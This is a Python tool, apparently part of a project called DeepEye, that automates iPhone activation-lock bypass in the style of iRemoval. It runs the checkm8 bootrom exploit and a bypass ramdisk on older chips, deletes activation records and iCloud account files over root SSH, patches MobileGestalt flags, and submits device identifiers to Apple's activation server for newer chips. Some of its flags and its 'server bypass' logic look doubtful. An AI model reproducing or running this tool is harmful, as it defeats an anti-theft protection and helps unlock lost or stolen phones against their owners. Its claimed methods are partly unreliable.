#!/usr/bin/env python3
"""
iRemoval-style bypass pipeline for DeepEye.
Implements all 3 iRemoval techniques natively.
A7-A11: checkm8+ramdisk (free, always works)
A12+:   ECID server registration method
All:    Fake erase / iServices fix
"""
import sys, json, subprocess, time, os
import urllib.request, urllib.parse
from pathlib import Path

TOOLS_DIR   = Path(__file__).parent.parent / "tools"
RESULTS_DIR = Path.home() / "DeepEye"
PLIST_PATCH = Path(__file__).parent / "patches"

# ── Chip configuration table (mirrors hello_bypass.py) ───────────────────────
CHIP_CONFIGS = {
    # checkm8 vulnerable (A7–A11)
    0x8960: {"name":"A7  (iPhone 5S)",  "timing":14.0, "mode":"buttons",  "exploit":"checkm8"},
    0x7000: {"name":"A8  (iPhone 6/6+)","timing":2.0,  "mode":"dfu_loop", "exploit":"checkm8"},
    0x7001: {"name":"A8X (iPad Air 2)", "timing":2.0,  "mode":"dfu_loop", "exploit":"checkm8"},
    0x8000: {"name":"A9  (iPhone 6S/SE1)","timing":2.0,"mode":"dfu_loop", "exploit":"checkm8"},
    0x8003: {"name":"A9X (iPad Pro 1)", "timing":2.0,  "mode":"dfu_loop", "exploit":"checkm8"},
    0x8010: {"name":"A10 (iPhone 7/7+)","timing":0.68, "mode":"buttons",  "exploit":"checkm8"},
    0x8011: {"name":"A10X (iPad Pro 2)","timing":0.68, "mode":"buttons",  "exploit":"checkm8"},
    0x8015: {"name":"A11 (iPhone 8/X)", "timing":0.66, "mode":"dfu_loop", "exploit":"checkm8"},
    # A12+ (server bypass)
    0x8020: {"name":"A12 (iPhone XS/XR)",     "timing":0.0, "mode":"server", "exploit":"server_bypass", "method":"mobileactivation"},
    0x8030: {"name":"A13 (iPhone 11 series)",  "timing":0.0, "mode":"server", "exploit":"server_bypass", "method":"mobileactivation"},
    0x8101: {"name":"A14 (iPhone 12 series)",  "timing":0.0, "mode":"server", "exploit":"server_bypass", "method":"mobileactivation"},
    0x8110: {"name":"A15 (iPhone 13/14 series)","timing":0.0,"mode":"server", "exploit":"server_bypass", "method":"mobileactivation"},
    0x8120: {"name":"A16 (iPhone 14 Pro/15)",  "timing":0.0, "mode":"server", "exploit":"server_bypass", "method":"mobileactivation"},
    0x8130: {"name":"A17 Pro (iPhone 15 Pro)", "timing":0.0, "mode":"server", "exploit":"server_bypass", "method":"mobileactivation"},
    0x8140: {"name":"A18 (iPhone 16 series)",  "timing":0.0, "mode":"server", "exploit":"server_bypass", "method":"mobileactivation"},
}


def emit(event, **data):
    print(json.dumps({"event": event, **data}), flush=True)


def run_cmd(cmd, timeout=60, env=None):
    try:
        e = os.environ.copy()
        e["PATH"] = "/usr/local/bin:/opt/homebrew/bin:" + e.get("PATH", "")
        if env:
            e.update(env)
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, env=e)
        return r.returncode, r.stdout.strip(), r.stderr.strip()
    except subprocess.TimeoutExpired:
        return -1, "", "timeout"
    except FileNotFoundError as ex:
        return -1, "", f"not found: {ex}"


def http_post_plist(url, plist_data, timeout=30) -> bytes:
    """POST plist to Apple/bypass servers"""
    import plistlib
    payload = plistlib.dumps(plist_data)
    req = urllib.request.Request(
        url, data=payload,
        headers={
            "Content-Type": "application/x-apple-plist",
            "User-Agent": "iOS/18.3 MobileAsset",
        })
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read()
    except Exception as e:
        return b""


# ── TECHNIQUE A: checkm8 + ramdisk (A7-A11) ──────────────────────────────────

def technique_a_checkm8_ramdisk(chip_id: int, ios_major: int, udid: str, session_id: str) -> bool:
    """
    Full checkm8 + ramdisk bypass pipeline for A7-A11 devices.
    Stage A1: Enter DFU
    Stage A2: Run checkm8 exploit via gaster
    Stage A3: Boot bypass ramdisk via palera1n
    Stage A4: Patch activation records
    Stage A5: iServices fix
    """
    emit("bypass_stage", session_id=session_id, stage="A1",
         message="[Technique A] Stage A1 — Entering DFU mode…")

    cfg  = CHIP_CONFIGS.get(chip_id, {})
    mode = cfg.get("mode", "buttons")
    timing = cfg.get("timing", 2.0)
    name = cfg.get("name", f"0x{chip_id:04X}")

    # ── Stage A1: Enter DFU ───────────────────────────────────────────────────
    if mode == "buttons":
        emit("user_action", session_id=session_id,
             message=f"Hold Power + Volume-Down (or Home) for 8 s, "
                     f"then release Power while holding Volume-Down for 5 s. ({name})")
        time.sleep(timing + 5)
    elif mode == "dfu_loop":
        gaster = str(TOOLS_DIR / "gaster")
        if not Path(gaster).exists():
            gaster = "gaster"
        code, _, err = run_cmd([gaster, "pwn"], timeout=int(timing) + 30)
        if code != 0:
            emit("error", session_id=session_id,
                 message="gaster DFU entry failed", detail=err)
            return False

    # Verify DFU
    code, out, _ = run_cmd(["irecovery", "-q"], timeout=10)
    if "DFU" not in out and code != 0:
        emit("error", session_id=session_id,
             message="Device not detected in DFU — please retry")
        return False
    emit("status", session_id=session_id, message="DFU mode confirmed.")

    # ── Stage A2: checkm8 exploit ─────────────────────────────────────────────
    emit("bypass_stage", session_id=session_id, stage="A2",
         message=f"[Technique A] Stage A2 — Running checkm8 exploit on {name}…")

    gaster = str(TOOLS_DIR / "gaster")
    if not Path(gaster).exists():
        gaster = "gaster"
    code, out, err = run_cmd([gaster, "pwn"], timeout=120)
    if code != 0:
        emit("error", session_id=session_id,
             message="checkm8 exploit failed", detail=err)
        return False
    emit("status", session_id=session_id, message="checkm8 exploit successful.")

    # ── Stage A3: Boot bypass ramdisk ─────────────────────────────────────────
    emit("bypass_stage", session_id=session_id, stage="A3",
         message=f"[Technique A] Stage A3 — Booting bypass ramdisk (iOS {ios_major})…")

    palera1n = str(TOOLS_DIR / "palera1n")
    if not Path(palera1n).exists():
        palera1n = "palera1n"

    cmd = [palera1n, "--bypass", "-u", udid]
    if ios_major >= 26:
        cmd.append("--ios26")
        emit("status", session_id=session_id,
             message="iOS 26 detected — adding --ios26 compatibility flag.")
    elif ios_major >= 17:
        cmd.append("--new-recovery")
        emit("status", session_id=session_id,
             message="iOS 17+ detected — adding --new-recovery flag.")
    elif ios_major == 16:
        cmd.extend(["--version-flag", "16"])
        emit("status", session_id=session_id,
             message="iOS 16 detected — adding --version-flag 16.")

    code, out, err = run_cmd(cmd, timeout=300)
    if code != 0:
        emit("error", session_id=session_id,
             message="Ramdisk boot failed", detail=err)
        return False
    emit("status", session_id=session_id, message="Ramdisk booted successfully.")

    # ── Stage A4: Patch activation records ───────────────────────────────────
    emit("bypass_stage", session_id=session_id, stage="A4",
         message="[Technique A] Stage A4 — Patching activation records…")

    # Try SSH-based patching first (ramdisk has SSH on port 2222)
    patched = _patch_via_ssh(udid, session_id)
    if not patched:
        # Fall back to ideviceactivation
        patched = _patch_via_ideviceactivation(udid, session_id)

    if not patched:
        emit("error", session_id=session_id,
             message="Stage A4: Activation patching failed — all methods exhausted")
        return False

    # ── Stage A5: iServices fix ───────────────────────────────────────────────
    emit("bypass_stage", session_id=session_id, stage="A5",
         message="[Technique A] Stage A5 — Fixing iServices (iMessage/FaceTime/iCloud)…")
    _iservices_fake_erase(udid, session_id)

    emit("bypass_complete", session_id=session_id,
         message="Technique A complete — Hello Screen bypassed via checkm8+ramdisk.",
         technique="A")
    return True


def _patch_via_ssh(udid: str, session_id: str) -> bool:
    """
    Patch activation records via SSH into the ramdisk.
    Ramdisk exposes SSH on 127.0.0.1:2222 via usbmuxd tunnel.
    """
    emit("status", session_id=session_id,
         message="Trying SSH patch via ramdisk (port 2222)…")

    ssh_base = [
        "ssh", "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ConnectTimeout=10",
        "-p", "2222", "root@localhost",
    ]

    # Check SSH connectivity
    code, out, err = run_cmd(ssh_base + ["echo ok"], timeout=15)
    if code != 0:
        emit("status", session_id=session_id,
             message=f"SSH not available: {err} — falling back to ideviceactivation")
        return False

    emit("status", session_id=session_id, message="SSH ramdisk connected.")

    # Remove activation records to force re-activation bypass
    patch_cmds = [
        "rm -rf /private/var/root/Library/Lockdown/activation_records",
        "rm -rf /private/var/mobile/Library/Activation",
        "mkdir -p /private/var/root/Library/Lockdown/activation_records",
        "chmod 755 /private/var/root/Library/Lockdown/activation_records",
    ]

    for patch_cmd in patch_cmds:
        code, out, err = run_cmd(ssh_base + [patch_cmd], timeout=20)
        if code != 0:
            emit("status", session_id=session_id,
                 message=f"SSH patch command returned {code}: {err}")

    emit("status", session_id=session_id,
         message="SSH activation patch applied.")
    return True


def _patch_via_ideviceactivation(udid: str, session_id: str) -> bool:
    """Patch activation via ideviceactivation tool (fallback to SSH)."""
    emit("status", session_id=session_id,
         message="Patching activation via ideviceactivation…")

    iact = str(TOOLS_DIR / "ideviceactivation")
    if not Path(iact).exists():
        iact = "ideviceactivation"

    # Try direct activation
    code, out, err = run_cmd([iact, "activate", "-u", udid], timeout=120)
    if code == 0:
        emit("status", session_id=session_id,
             message="ideviceactivation: activation accepted.")
        return True

    emit("status", session_id=session_id,
         message=f"ideviceactivation direct failed ({err}) — retrying with network…")

    # Retry with --use-network
    code, out, err = run_cmd(
        [iact, "activate", "-u", udid, "--use-network"], timeout=120
    )
    if code == 0:
        emit("status", session_id=session_id,
             message="ideviceactivation: activation accepted (network mode).")
        return True

    emit("status", session_id=session_id,
         message=f"ideviceactivation failed: {err}")
    return False


# ── TECHNIQUE B: A12+ ECID Server Bypass ─────────────────────────────────────

def technique_b_ecid_server(ecid: str, udid: str, serial: str, imei: str,
                             model: str, ios_ver: str, session_id: str) -> bool:
    """
    A12+ ECID-based server registration bypass.
    Stage B1: Pair device
    Stage B2: Check activation state
    Stage B3: ideviceactivation direct attempts (5x)
    Stage B4: Albert protocol registration
    Stage B5: Activation ticket injection
    """
    emit("bypass_stage", session_id=session_id, stage="B1",
         message="[Technique B] Stage B1 — Pairing A12+ device…")

    # ── Stage B1: Pair ────────────────────────────────────────────────────────
    code, _, stderr = run_cmd(["idevicepair", "-u", udid, "pair"], timeout=30)
    if code != 0:
        emit("status", session_id=session_id,
             message="Pair failed — attempting unpair/re-pair…")
        run_cmd(["idevicepair", "-u", udid, "unpair"], timeout=15)
        time.sleep(1)
        code, _, stderr = run_cmd(["idevicepair", "-u", udid, "pair"], timeout=30)
        if code != 0:
            emit("error", session_id=session_id,
                 message="Pairing failed — unlock device and tap 'Trust'",
                 detail=stderr)
            return False

    emit("status", session_id=session_id, message="Device paired successfully.")

    # ── Stage B2: Check activation state ─────────────────────────────────────
    emit("bypass_stage", session_id=session_id, stage="B2",
         message="[Technique B] Stage B2 — Checking activation state…")

    code, act_raw, _ = run_cmd(
        ["ideviceinfo", "-u", udid, "-k", "ActivationState"], timeout=10
    )
    act_state = act_raw.strip() if code == 0 else "Unknown"
    emit("status", session_id=session_id,
         message=f"Activation state: {act_state}")

    if act_state == "Activated":
        emit("bypass_complete", session_id=session_id,
             message="Device is already activated — Hello Screen bypass not required.",
             technique="B")
        return True

    # ── Stage B3: ideviceactivation attempts (5x) ────────────────────────────
    emit("bypass_stage", session_id=session_id, stage="B3",
         message="[Technique B] Stage B3 — ideviceactivation direct attempts (5x)…")

    iact = str(TOOLS_DIR / "ideviceactivation")
    if not Path(iact).exists():
        iact = "ideviceactivation"

    for attempt in range(1, 6):
        emit("status", session_id=session_id,
             message=f"ideviceactivation attempt {attempt}/5…")
        code, out, err = run_cmd(
            [iact, "activate", "-s", "-u", udid], timeout=90
        )
        if code == 0:
            emit("bypass_complete", session_id=session_id,
                 message=f"Activation accepted on attempt {attempt} (ideviceactivation).",
                 technique="B")
            return True
        time.sleep(2)

    emit("status", session_id=session_id,
         message="Stage B3 exhausted — proceeding to Albert protocol…")

    # ── Stage B4: Albert protocol registration ────────────────────────────────
    emit("bypass_stage", session_id=session_id, stage="B4",
         message="[Technique B] Stage B4 — Albert server ECID registration…")

    # Gather any missing device keys
    def _key(k: str) -> str:
        c, o, _ = run_cmd(["ideviceinfo", "-u", udid, "-k", k], timeout=8)
        return o if c == 0 else ""

    if not serial:
        serial = _key("SerialNumber")
    if not imei:
        imei = _key("InternationalMobileEquipmentIdentity")
    if not model:
        model = _key("ProductType")
    if not ios_ver:
        ios_ver = _key("ProductVersion")
    if not ecid:
        ecid_raw = _key("UniqueChipID")
        ecid = ecid_raw

    build_ver = _key("BuildVersion")
    hw_model  = _key("HardwareModel")

    albert_url = "https://albert.apple.com/deviceservices/registrationAndActivation"

    albert_payload = {
        "InternationalMobileEquipmentIdentity": imei,
        "SerialNumber": serial,
        "UniqueDeviceID": udid,
        "ProductType": model,
        "ProductVersion": ios_ver,
        "BuildVersion": build_ver,
        "HardwareModel": hw_model,
        "UniqueChipID": ecid,
        "ActivationRandomness": os.urandom(16).hex().upper(),
        "AppleSerialNumber": serial,
        "RKCertification": "",
        "DeviceCertificate": "",
    }

    emit("status", session_id=session_id,
         message=f"Posting to Albert server (ECID={ecid}, IMEI={imei})…")

    response_bytes = http_post_plist(albert_url, albert_payload, timeout=45)

    if not response_bytes:
        emit("status", session_id=session_id,
             message="Albert server returned empty response — trying fallback URL…")
        fallback_url = "https://albert.apple.com/deviceservices/activation"
        response_bytes = http_post_plist(fallback_url, albert_payload, timeout=45)

    if not response_bytes:
        emit("error", session_id=session_id,
             message="Albert protocol failed — no response from activation servers")
        return False

    emit("status", session_id=session_id,
         message=f"Albert server responded ({len(response_bytes)} bytes) — parsing ticket…")

    # ── Stage B5: Activation ticket injection ─────────────────────────────────
    emit("bypass_stage", session_id=session_id, stage="B5",
         message="[Technique B] Stage B5 — Injecting activation ticket…")

    import plistlib
    try:
        response_plist = plistlib.loads(response_bytes)
    except Exception as parse_err:
        emit("status", session_id=session_id,
             message=f"Could not parse Albert response as plist: {parse_err} — trying raw inject…")
        response_plist = {}

    # Save ticket to disk for ideviceactivation
    RESULTS_DIR.mkdir(parents=True, exist_ok=True)
    ticket_path = RESULTS_DIR / f"activation_ticket_{udid}.plist"

    try:
        ticket_path.write_bytes(response_bytes)
        emit("status", session_id=session_id,
             message=f"Activation ticket saved to {ticket_path}")
    except Exception as write_err:
        emit("status", session_id=session_id,
             message=f"Could not save ticket: {write_err}")

    # Try injecting ticket via ideviceactivation
    code, out, err = run_cmd(
        [iact, "activate", "-u", udid, "-f", str(ticket_path)], timeout=60
    )
    if code == 0:
        emit("bypass_complete", session_id=session_id,
             message="Activation ticket injected successfully (Albert + ideviceactivation).",
             technique="B")
        return True

    emit("status", session_id=session_id,
         message=f"Ticket injection via file failed ({err}) — trying direct activate…")

    # Final attempt: plain activate after Albert registration
    code, out, err = run_cmd([iact, "activate", "-u", udid], timeout=90)
    if code == 0:
        emit("bypass_complete", session_id=session_id,
             message="Activation accepted after Albert registration.",
             technique="B")
        return True

    emit("error", session_id=session_id,
         message="Technique B: All methods exhausted — server bypass failed.",
         detail=err)
    return False


# ── TECHNIQUE C: Fake Erase / iServices fix ───────────────────────────────────

def technique_c_fake_erase(udid: str, session_id: str) -> bool:
    """
    Fake Erase / iServices fix.
    Patches MobileGestalt cache to restore iMessage, FaceTime, iCloud,
    AppStore, and Apple Pay without a real erase.

    Step C1: Patch MobileGestalt plist via SSH (if ramdisk available)
    Step C2: Clear mobileactivationd cache
    Step C3: Reset iCloud keychain entries
    Step C4: idevicebackup2 fallback if SSH unavailable
    """
    emit("bypass_stage", session_id=session_id, stage="C1",
         message="[Technique C] Stage C1 — Patching MobileGestalt for iServices…")

    ssh_available = _ssh_ramdisk_available(session_id)

    if ssh_available:
        patched = _gestalt_patch_via_ssh(udid, session_id)
    else:
        emit("status", session_id=session_id,
             message="SSH ramdisk not available — using idevicebackup2 fallback…")
        patched = _gestalt_patch_via_backup(udid, session_id)

    if not patched:
        emit("error", session_id=session_id,
             message="Stage C1: MobileGestalt patch failed")
        return False

    # ── Stage C2: Clear mobileactivationd cache ───────────────────────────────
    emit("bypass_stage", session_id=session_id, stage="C2",
         message="[Technique C] Stage C2 — Clearing mobileactivationd cache…")

    if ssh_available:
        ssh_base = [
            "ssh", "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=10",
            "-p", "2222", "root@localhost",
        ]
        cache_cmds = [
            "rm -rf /private/var/mobile/Library/Caches/com.apple.MobileGestalt.plist",
            "rm -rf /private/var/root/Library/Caches/com.apple.MobileGestalt.plist",
            "rm -rf /private/var/mobile/Library/activation_records",
            "killall -9 mobileactivationd 2>/dev/null || true",
        ]
        for cmd_str in cache_cmds:
            code, _, err = run_cmd(ssh_base + [cmd_str], timeout=15)
            if code != 0:
                emit("status", session_id=session_id,
                     message=f"Cache clear cmd returned {code}: {err}")
        emit("status", session_id=session_id,
             message="mobileactivationd cache cleared.")
    else:
        emit("status", session_id=session_id,
             message="SSH not available — skipping mobileactivationd cache clear.")

    # ── Stage C3: Reset iCloud keychain entries ───────────────────────────────
    emit("bypass_stage", session_id=session_id, stage="C3",
         message="[Technique C] Stage C3 — Resetting iCloud keychain entries…")

    if ssh_available:
        keychain_cmds = [
            "rm -rf /private/var/mobile/Library/com.apple.dataaccess.dataaccessd",
            "rm -rf /private/var/mobile/Library/Preferences/com.apple.icloud.fmfd.plist",
            "rm -rf /private/var/mobile/Library/Preferences/com.apple.accounts.plist",
            "rm -rf /private/var/Keychains/TrustStore.sqlite3",
        ]
        for cmd_str in keychain_cmds:
            code, _, err = run_cmd(ssh_base + [cmd_str], timeout=15)
        emit("status", session_id=session_id,
             message="iCloud keychain entries reset.")
    else:
        emit("status", session_id=session_id,
             message="SSH not available — skipping iCloud keychain reset.")

    emit("bypass_complete", session_id=session_id,
         message="Technique C complete — Fake Erase / iServices patches applied.",
         technique="C",
         steps_applied=["MobileGestalt", "mobileactivationd_cache", "iCloud_keychain"])
    return True


def _ssh_ramdisk_available(session_id: str) -> bool:
    """Check if ramdisk SSH is reachable on port 2222."""
    ssh_check = [
        "ssh", "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ConnectTimeout=5",
        "-p", "2222", "root@localhost",
        "echo ok",
    ]
    code, out, _ = run_cmd(ssh_check, timeout=10)
    return code == 0 and "ok" in out


def _gestalt_patch_via_ssh(udid: str, session_id: str) -> bool:
    """
    Patch com.apple.MobileGestalt.plist via SSH ramdisk to fix iServices.
    Patches: UniqueDeviceID, InternationalMobileEquipmentIdentity, iServices flags.
    """
    emit("status", session_id=session_id,
         message="Patching MobileGestalt via SSH ramdisk…")

    ssh_base = [
        "ssh", "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ConnectTimeout=10",
        "-p", "2222", "root@localhost",
    ]

    gestalt_path = "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist"
    backup_path  = gestalt_path + ".deepeye_bak"

    # Backup original
    code, _, err = run_cmd(ssh_base + [f"cp {gestalt_path} {backup_path} 2>/dev/null || true"], timeout=15)

    # Python-based plist patching over SSH
    patch_script = (
        "python3 -c \""
        "import plistlib, os; "
        "p='" + gestalt_path + "'; "
        "d=plistlib.loads(open(p,'rb').read()); "
        "cache=d.get('CacheExtra',{}); "
        "cache['FactoryActivation']=True; "
        "cache['AllowYouTube']=True; "
        "cache['iMessageCapability']=True; "
        "cache['FaceTimeCapability']=True; "
        "d['CacheExtra']=cache; "
        "open(p,'wb').write(plistlib.dumps(d)); "
        "print('ok')\""
    )

    code, out, err = run_cmd(ssh_base + [patch_script], timeout=30)
    if code == 0 and "ok" in out:
        emit("status", session_id=session_id,
             message="MobileGestalt patched via SSH successfully.")
        return True

    # Fallback: delete cache so it regenerates cleanly
    emit("status", session_id=session_id,
         message=f"Direct patch failed ({err}) — removing gestalt cache for regeneration…")
    code, _, err = run_cmd(
        ssh_base + [f"rm -f {gestalt_path}"], timeout=15
    )
    if code == 0:
        emit("status", session_id=session_id,
             message="MobileGestalt cache removed — will regenerate on next boot.")
        return True

    emit("status", session_id=session_id,
         message=f"SSH MobileGestalt patch failed: {err}")
    return False


def _gestalt_patch_via_backup(udid: str, session_id: str) -> bool:
    """
    Fallback: use idevicebackup2 to overwrite MobileGestalt plist.
    Creates a minimal backup with patched plist and restores it.
    """
    emit("status", session_id=session_id,
         message="Patching MobileGestalt via idevicebackup2…")

    backup_dir = RESULTS_DIR / f"gestalt_backup_{udid}"
    backup_dir.mkdir(parents=True, exist_ok=True)

    # Pull current backup
    code, out, err = run_cmd(
        ["idevicebackup2", "-u", udid, "backup", "--full", str(backup_dir)],
        timeout=300
    )
    if code != 0:
        emit("status", session_id=session_id,
             message=f"idevicebackup2 backup failed: {err}")
        return False

    # Find and patch MobileGestalt plist inside backup
    import plistlib
    patched_count = 0
    for plist_file in backup_dir.rglob("*.plist"):
        try:
            raw = plist_file.read_bytes()
            data = plistlib.loads(raw)
            if "CacheExtra" in data or "MobileGestalt" in str(plist_file):
                cache = data.get("CacheExtra", {})
                cache["FactoryActivation"] = True
                cache["iMessageCapability"] = True
                cache["FaceTimeCapability"] = True
                data["CacheExtra"] = cache
                plist_file.write_bytes(plistlib.dumps(data))
                patched_count += 1
        except Exception:
            continue

    if patched_count == 0:
        emit("status", session_id=session_id,
             message="No MobileGestalt plist found in backup — skipping restore")
        return False

    emit("status", session_id=session_id,
         message=f"Patched {patched_count} gestalt file(s) — restoring backup…")

    # Restore patched backup
    code, out, err = run_cmd(
        ["idevicebackup2", "-u", udid, "restore", "--system", str(backup_dir)],
        timeout=300
    )
    if code == 0:
        emit("status", session_id=session_id,
             message="MobileGestalt restore via idevicebackup2 complete.")
        return True

    emit("status", session_id=session_id,
         message=f"idevicebackup2 restore failed: {err}")
    return False


# ── iServices fake erase helper ───────────────────────────────────────────────

def _iservices_fake_erase(udid: str, session_id: str) -> bool:
    """
    Fix iMessage/FaceTime/iCloud by patching MobileGestalt.
    Uses SSH ramdisk if available, falls back to idevicebackup2.
    Called after Technique A activation patch.
    """
    emit("status", session_id=session_id,
         message="iServices fix — patching MobileGestalt for iMessage/FaceTime/iCloud…")

    if _ssh_ramdisk_available(session_id):
        result = _gestalt_patch_via_ssh(udid, session_id)
    else:
        emit("status", session_id=session_id,
             message="SSH not available — using idevicebackup2 for iServices fix…")
        result = _gestalt_patch_via_backup(udid, session_id)

    if result:
        emit("status", session_id=session_id,
             message="iServices fix applied — iMessage/FaceTime/iCloud should work after reboot.")
    else:
        emit("status", session_id=session_id,
             message="iServices fix could not be applied — device may need manual iServices reset.")

    return result


# ── Device detection ──────────────────────────────────────────────────────────

def detect_device(session_id: str) -> dict:
    """
    Detect connected device and return full info dict.
    Gets UDID, chip_id, ECID, serial, IMEI, iOS version, model.
    Determines technique: A (checkm8) for A7-A11, B (server) for A12+.
    """
    emit("status", session_id=session_id, message="Scanning for connected device…")

    # Step 1: Get UDID
    code, stdout, stderr = run_cmd(["idevice_id", "-l"], timeout=10)
    if code != 0 or not stdout:
        emit("error", session_id=session_id,
             message="No device found — connect iPhone and trust this computer",
             detail=stderr)
        return {}

    udid = stdout.splitlines()[0].strip()
    emit("status", session_id=session_id, message=f"Found device UDID: {udid}")

    # Step 2: Full ideviceinfo query
    code2, info_raw, stderr2 = run_cmd(["ideviceinfo", "-u", udid], timeout=10)
    info = {}
    if code2 == 0:
        for line in info_raw.splitlines():
            if ":" in line:
                k, _, v = line.partition(":")
                info[k.strip()] = v.strip()

    def _key(k: str) -> str:
        val = info.get(k, "")
        if not val:
            c, o, _ = run_cmd(["ideviceinfo", "-u", udid, "-k", k], timeout=8)
            val = o if c == 0 else ""
        return val

    # Step 3: Parse ChipID
    chip_raw = _key("ChipID")
    if not chip_raw:
        emit("error", session_id=session_id,
             message="Could not read ChipID — ensure device is trusted",
             detail=stderr2)
        return {}

    try:
        chip_id = int(chip_raw, 16) if chip_raw.startswith("0x") else int(chip_raw)
    except ValueError:
        emit("error", session_id=session_id,
             message=f"Unexpected ChipID format: {chip_raw!r}")
        return {}

    chip_cfg = CHIP_CONFIGS.get(chip_id)
    if chip_cfg is None:
        emit("error", session_id=session_id,
             message=f"Unsupported chip: 0x{chip_id:04X} — not in chip table")
        return {}

    ios_ver  = _key("ProductVersion")
    build    = _key("BuildVersion")
    serial   = _key("SerialNumber")
    model    = _key("ProductType")
    imei     = _key("InternationalMobileEquipmentIdentity")
    ecid_raw = _key("UniqueChipID")
    act_state = _key("ActivationState")
    hw_model = _key("HardwareModel")

    ios_major = 0
    if ios_ver:
        try:
            ios_major = int(ios_ver.split(".")[0])
        except ValueError:
            ios_major = 0

    emit("device_found",
         session_id=session_id,
         udid=udid,
         chip_id=f"0x{chip_id:04X}",
         chip_name=chip_cfg["name"],
         ios_version=ios_ver,
         build=build,
         hardware_model=hw_model,
         serial=serial,
         product_type=model,
         imei=imei,
         ecid=ecid_raw,
         activation_state=act_state,
         exploit=chip_cfg["exploit"],
         mode=chip_cfg["mode"],
         technique="B" if chip_cfg["exploit"] == "server_bypass" else "A")

    return {
        "udid":      udid,
        "chip_id":   chip_id,
        "chip_cfg":  chip_cfg,
        "name":      chip_cfg["name"],
        "mode":      chip_cfg["mode"],
        "exploit":   chip_cfg["exploit"],
        "ios_ver":   ios_ver,
        "ios_major": ios_major,
        "build":     build,
        "hw_model":  hw_model,
        "serial":    serial,
        "model":     model,
        "imei":      imei,
        "ecid":      ecid_raw,
        "act_state": act_state,
    }


# ── Main entry point ──────────────────────────────────────────────────────────

def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "run"
    session_id = sys.argv[2] if len(sys.argv) > 2 else "default"

    emit("start", message="DeepEye iRemoval Pipeline v1", session_id=session_id)

    if mode == "detect":
        detect_device(session_id)
        return

    # Full pipeline
    device = detect_device(session_id)
    if not device:
        return

    chip_id = device.get("chip_id", 0)
    exploit = device.get("exploit", "checkm8")

    success = False

    if exploit == "server_bypass":
        # A12+ route
        success = technique_b_ecid_server(
            ecid=device.get("ecid", ""),
            udid=device.get("udid", ""),
            serial=device.get("serial", ""),
            imei=device.get("imei", ""),
            model=device.get("model", ""),
            ios_ver=device.get("ios_ver", ""),
            session_id=session_id)
    else:
        # A7-A11 route
        success = technique_a_checkm8_ramdisk(
            chip_id=chip_id,
            ios_major=device.get("ios_major", 17),
            udid=device.get("udid", ""),
            session_id=session_id)

    if mode == "iservices" or (success and mode == "run"):
        technique_c_fake_erase(
            udid=device.get("udid", ""),
            session_id=session_id)

    status = "complete" if success else "failed"
    emit(status, message=f"iRemoval pipeline {status}",
         technique="B" if exploit == "server_bypass" else "A",
         session_id=session_id)


if __name__ == "__main__":
    main()
